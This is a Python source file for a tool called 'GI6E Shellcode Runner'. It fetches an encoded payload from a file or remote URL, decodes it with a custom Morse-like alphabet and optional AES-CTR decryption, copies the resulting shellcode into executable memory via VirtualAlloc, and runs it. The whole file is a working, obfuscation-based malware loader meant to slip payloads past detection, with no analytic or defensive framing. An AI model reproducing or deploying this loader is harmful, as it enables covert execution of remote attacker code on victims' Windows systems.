import argparse
import requests
import os
import ctypes
import threading
from ctypes import wintypes
import codecs
from Crypto.Cipher import AES
NONCE = b'\x46\x55\x43\x4B\x59\x4F\x55\x30'


class aesCtr():
    def ctr_encrypt(self,key_str: str, plaintext: str):
        if len(key_str) < 8:
            return False
        key_bytes = key_str.encode('utf-8')
        if len(key_bytes) < 16:
            key_bytes = key_bytes.ljust(16, b'\0')
        else:
            key_bytes = key_bytes[:16]
        cipher = AES.new(key_bytes, AES.MODE_CTR, nonce=NONCE)
        plaintext_bytes = plaintext.encode('utf-8')  
        ciphertext = cipher.encrypt(plaintext_bytes)
        return ciphertext.hex()

    def ctr_decrypt(self,key_str: str, ciphertext_hex: str):
        if len(key_str) < 8 or '?' in ciphertext_hex:
            return False
        key_bytes = key_str.encode('utf-8')
        if len(key_bytes) < 16:
            key_bytes = key_bytes.ljust(16, b'\0')
        else:
            key_bytes = key_bytes[:16]
        ciphertext = bytes.fromhex(ciphertext_hex)
        cipher = AES.new(key_bytes, AES.MODE_CTR, nonce=NONCE)
        plaintext = cipher.decrypt(ciphertext)
        return plaintext.decode('utf-8', errors='ignore')


class grid():
    def __init__(self):
        self.__MORSE_CODE_DICT = {
        'A': '..-..-','0': '..-.-.', '6': '..-.--',
        'B': '.-...-', '1': '.-..-.', '7': '.-..--',
        'C': '.--..-','2': '.--.-.','8': '.--.--',
        'D': '-....-','3': '-...-.','9': '-...--',
        'E': '-.-..-', '4': '-.-.-.','+':'-.-.--',
        'F': '--...-', '5': '--..-.','-':'--..--',
        '.':'.'
        }
        self.aes = aesCtr()
        self.__MORSE_REVERSE_DICT = {v: k for k, v in self.__MORSE_CODE_DICT.items()}

    def grid_2_text(self,text:str,key:str=''): 
        if key and (not len(key)>=8)  :return False
        words = text.strip("'").split(' . ') 
        words = [x for x in words if x]
        decoded_words = ''
        for grid_ in words:
            if grid_ == self.__MORSE_CODE_DICT['+']:
                continue
            decoded_words += self.__MORSE_REVERSE_DICT.get(grid_,'?')
        if key :
            if not (decoded_words :=  self.aes.ctr_decrypt(key,decoded_words)):
                return False
            
        return self.__hex_string_2_str(decoded_words)
 
    def __hex_string_2_str(self, hex_:str):
        try:
            return bytes.fromhex(hex_).decode('utf-8')
        except Exception:
            return False

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = wintypes.LPVOID
kernel32.VirtualAlloc.argtypes = (
    wintypes.LPVOID,
    ctypes.c_size_t,
    wintypes.DWORD,
    wintypes.DWORD
)
kernel32.RtlMoveMemory.argtypes = (
    wintypes.LPVOID,
    wintypes.LPVOID,
    ctypes.c_size_t
)

def exec_shellcode(shellcode: bytes):
    try:
        size = len(shellcode)
        ptr = kernel32.VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if not ptr:
            raise OSError("VirtualAlloc failed")
        buf = (ctypes.c_char * size).from_buffer_copy(shellcode)
        kernel32.RtlMoveMemory(ptr, buf, size)
        func = ctypes.CFUNCTYPE(None)(ptr)
        func()
    except OSError:
        pass

def Run(shellcode: bytes):
    t = threading.Thread(target=exec_shellcode, args=(shellcode,))
    t.daemon = True
    t.start()
    t.join()

def handle_load(path_or_url: str) -> str:
    if path_or_url.startswith(("http://", "https://")):
        try:
            resp = requests.get(path_or_url, timeout=5)
            resp.raise_for_status()
            return resp.text.strip()
        except Exception:
            exit(1)
    elif os.path.isfile(path_or_url):
        try:
            with open(path_or_url, "r", encoding="utf-8") as f:
                return f.read().strip()
        except Exception:
            exit(1)
    else:
        exit(1)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='GI6E Shellcode Runner')
    parser.add_argument('-load', type=str, help='URL or file path to load Grid code')
    parser.add_argument('-key', type=str, help='Optional key for decoding')
    args = parser.parse_args()
    g = grid()

    if args.load:
        raw_grid = handle_load(args.load)
        decoded = g.grid_2_text(raw_grid, key=args.key) if args.key else g.grid_2_text(raw_grid)
        print(f"[=] Decoded string:\n{decoded}")
        s = decoded.strip().strip("'\"")
        if "\\x" in s:
            shellcode_bytes = codecs.decode(s, 'unicode_escape').encode('latin1')
        else:
            shellcode_bytes = bytes.fromhex(''.join(s.split()))
        Run(shellcode_bytes)
    else:
        parser.print_help()
        exit(1)
